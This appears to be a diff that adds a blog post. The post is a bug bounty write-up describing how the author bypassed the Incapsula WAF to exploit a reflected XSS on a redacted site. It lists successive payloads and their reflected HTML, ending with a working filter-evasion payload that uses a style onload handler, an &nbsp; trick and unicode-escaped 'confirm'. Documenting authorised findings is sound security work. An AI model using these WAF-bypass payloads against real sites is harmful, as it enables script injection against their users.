@@ -1,0 +1,101 @@
+---
+layout: default
+title: XSS - Incapsula bypass
+---
+
+<h1>XSS - Incapsula bypass</h1>
+<p class="date">29/10/2019</p>
+
+<p>This is a little write-up about how I bypassed Incapsula WAF to exploit a Cross-Site Scripting (XSS) vulnerability on a private bug bounty program.</p>
+
+<hr>
+
+<style>
+	.prettyprint b span{
+		text-decoration: underline;
+	}
+</style>
+
+<p>There was a page on this private program's website where the URL path was reflected on the response body and wasn't being encoded properly, which could result in a possible XSS vulnerability.</p>
+
+<p>When using a <code>"</code> in the path, it was possible to escape the <code>href</code> attribute of an <code>a</code> element.</p>
+
+<code>https://redacted.com/path/?site<b>"kkk</b></code>
+<pre class="prettyprint">
+&lt;a href="https://redacted.com/?site<b>"kkk</b>=&etsi=1557&k3e=_main">
+</pre>
+
+<p>It was also possible to use <code><</code>, <code>></code> and <code>/</code> characters, which should mean that getting a XSS was easy.</p>
+
+<code>https://redacted.com/path/?site<b>">&lt;x>aa&lt;/x></b></code>
+<pre class="prettyprint">
+&lt;a href="https://redacted.com/?site<b>">&lt;x>aa&lt;/x></b>=&etsi=1557&k3e=_main">
+</pre>
+
+<p>But when trying a default payload a <code>403</code> error is returned.</p>
+
+<code>https://redacted.com/path/?site<b>">&lt;script>alert()&lt;/script></b></code>
+<p><b>403 Error</b></p>
+
+<p>I tried with different payloads and stuck with a <code>style</code> element with an <code>onload</code> attribute that executes the javascript code, which seemed to not be filtered.</p> 
+
+<code>https://redacted.com/path/?site<b>">&lt;style onload=alert()>&lt;/style></b></code>
+
+<pre class="prettyprint">
+&lt;a href="https://redacted.com/?site<b>">&lt;style_onload=alert%28%29%3E%3C%2Fstyle%3E</b>&etsi=1557&k3e=_main">
+</pre>
+
+<p>There are two problems here:</p>
+<ul>
+	<li>Spaces are being replaced by <code>_</code>.</li>
+	<li>Everything after a <code>=</code> gets URL encoded.</li>
+</ul>
+
+<p>The spaces issue is easy to resolve by using <code>/</code> instead.</p>
+
+<code>https://redacted.com/path/?site<b>">&lt;style/onload=alert()>&lt;/style></b></code>
+
+<pre class="prettyprint">
+&lt;a href="https://redacted.com/?site<b>">&lt;style/onload=alert%28%29%3E%3C%2Fstyle%3E</b>&etsi=1557&k3e=_main">
+</pre>
+
+<p>But to get a working payload, non-encoded characters are needed after the <code>=</code> character. So I started trying with tons of symbols and found that every time a <code>&</code> was reflected, a <code>=</code> was placed before it and the payload wasn't encoded.</p>
+
+<code>https://redacted.com/path/?site<b>">oo&kk></b></code>
+<pre class="prettyprint">
+&lt;a href="https://redacted.com/path/?site<b>">oo=&kk></b>=&countrystr_ch=belgium&lang=7">
+</pre>
+
+<p>Therefore, it was possible to use a <code>&</code> after <code>onload</code> to automatically add the <code>=</code>.</p> 
+
+<code>https://redacted.com/path/?site<b>">&lt;style/onload&alert()>&lt;/style></b></code>
+<pre class="prettyprint">
+&lt;a href="https://redacted.com/?site<b>">&lt;style/onload=&alert()>&lt;/style></b>=&etsi=1557&k3e=_main">
+</pre>
+
+<p>But <code>&alert()</code> is not a valid javascript code and it's not possible to execute the alert.</p>
+
+<p><code>SyntaxError: expected expression, got '&'</code></p>
+
+<p>Here is when HTML encoding becomes useful, <code>&amp;nbsp;</code> is the same as writing a whitespace, being able to get a valid javascript code (<code> alert()</code>).</p>
+
+<code>https://redacted.com/path/?site<b>">&lt;style/onload&amp;nbsp;alert()>&lt;/style></b></code>
+<p><b>403 Error</b></p>
+
+<p>Unfortunately this was blocked by the WAF, so I tried with different javascript functions instead of alert.</p>
+
+<code>https://redacted.com/path/?site<b>">&lt;style/onload&amp;nbsp;confirm()>&lt;/style></b></code>
+<p><b>403 Error</b></p>
+
+<p>Same error.</p>
+
+<p>But finally, it is possible to bypass this WAF restriction by using a unicode sequence since javascript interprets <code>\u006e</code> as a <code>n</code>, then <code>co\u006efirm</code> = <code>confirm</code>.</p>
+
+<code>https://redacted.com/path/?site<b>">&lt;style/onload&amp;nbsp;co\u006efirm()>&lt;/style></b></code>
+
+<pre class="prettyprint">
+&lt;a href="https://redacted.com/?site<b>">&lt;style/onload=&amp;nbsp;co\u006efirm()>&lt;/style></b>=&etsi=1557&k3e=_main">
+</pre>
+
+
+<img class="img-fluid" src="/static/img/bb/xss-incapsula/alert.png">
